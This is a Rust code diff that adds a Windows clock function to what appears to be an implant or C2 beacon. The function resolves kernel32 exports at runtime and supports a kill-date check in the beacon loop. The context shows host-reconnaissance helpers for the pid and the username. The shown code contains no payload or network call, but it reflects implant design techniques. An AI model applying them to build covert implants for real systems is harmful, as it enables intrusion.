@@ -104,6 +104,40 @@ pub fn pid() -> u32 {
     }
 }
 
+/// Wall-clock time as Unix seconds (since 1970-01-01 UTC), or 0 on failure.
+///
+/// Resolves `GetSystemTimeAsFileTime` from kernel32 (always loaded) and
+/// converts the returned FILETIME (100ns ticks since 1601-01-01 UTC) to Unix
+/// seconds. The beacon loop calls this once per cycle to enforce
+/// `ImplantConfig.expires_at` (kill-date). Returns 0 if the export can't be
+/// resolved — callers MUST treat 0 as "unknown, do not enforce", NOT as the
+/// epoch, so that a missing clock can't kill the beacon spuriously.
+pub fn now_unix() -> u64 {
+    type GetSystemTimeAsFileTime =
+        unsafe extern "system" fn(*mut u8); // *mut FILETIME (8 bytes, low+high u32)
+    let addr = match unsafe { export_addr(b"kernel32.dll", b"GetSystemTimeAsFileTime") } {
+        Some(a) => a,
+        None => return 0,
+    };
+    let f: GetSystemTimeAsFileTime = unsafe { core::mem::transmute(addr) };
+    // FILETIME layout: dwLowDateTime (u32) | dwHighDateTime (u32), 8 bytes total.
+    let mut ft = [0u8; 8];
+    unsafe { f(ft.as_mut_ptr()) };
+    let low = u32::from_le_bytes([ft[0], ft[1], ft[2], ft[3]]) as u64;
+    let high = u32::from_le_bytes([ft[4], ft[5], ft[6], ft[7]]) as u64;
+    let filetime_100ns = (high << 32) | low;
+    // FILETIME epoch (1601-01-01) → Unix epoch (1970-01-01): 11644473600 seconds.
+    // FILETIME counts in 100ns ticks; divide by 10_000_000 to get seconds.
+    const FILETIME_EPOCH_OFFSET_100NS: u64 = 116_444_736_000_000_000;
+    const TICKS_PER_SEC: u64 = 10_000_000;
+    // Guard against the (impossible-on-a-real-host) case where FILETIME is
+    // below the Unix epoch — saturating_sub avoids an underflow wrap that
+    // would produce a huge bogus timestamp.
+    filetime_100ns
+        .saturating_sub(FILETIME_EPOCH_OFFSET_100NS)
+        / TICKS_PER_SEC
+}
+
 /// `GetUserNameW` → username, or `"user"` on failure. Needs `advapi32.dll`
 /// (force-loaded; not present by default in a minimal process).
 pub fn username() -> String {
